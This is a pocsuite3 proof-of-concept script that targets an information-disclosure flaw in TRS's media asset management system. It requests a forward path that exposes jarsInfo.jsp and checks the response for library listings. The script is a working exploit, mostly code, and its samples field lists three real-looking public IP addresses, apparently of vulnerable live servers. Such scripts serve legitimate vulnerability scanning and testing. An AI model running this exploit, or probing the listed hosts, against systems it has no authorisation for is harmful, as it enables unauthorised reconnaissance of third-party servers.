#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re

class TestPOC(POCBase):
    vulID = '''DSO-06198'''
    cweID = "CWE-200"
    appDevLanguage = ""
    appCategory = ""
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = '''1.0'''
    author = ''''''
    vulDate = '''2022-05-16'''
    createDate = '''2022-05-18'''
    updateDate = '''2022-07-04'''
    name = '''拓尔思 媒资管理系统存在信息泄露漏洞'''
    desc = '''拓尔思 媒资管理系统存在信息泄露漏洞，攻击者可利用该漏洞获取系统敏感信息等。'''
    solution = '''<p>请关注厂商并更新至安全版本</p>
<p>厂商链接: http://www.trs.com.cn/</p>'''
    severity = '''medium'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    proto = ['http']
    scanFlag = 1
    tag = ['important']
    references = ['''''']
    appName = '''拓尔思 TRS媒资管理系统'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''http://42.176.201.32:8080/''','''http://122.137.242.26:8085/''','''http://139.209.32.12:8080/''']
    install_requires = ['''''']
    def _verify(self):              #验证模式
        result = {}
        path = '/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/jarsInfo.jsp'
        target = self.url + path
        resp = requests.get(target, verify = False, allow_redirects = False, timeout = 10)
        if  'jar中的名称和版本' in resp.text and 'activation.jar' in resp.text and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Content'] = resp.content[:200] 
        return self.parse_verify(result)

    def _attack(self):       #攻击模式
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)
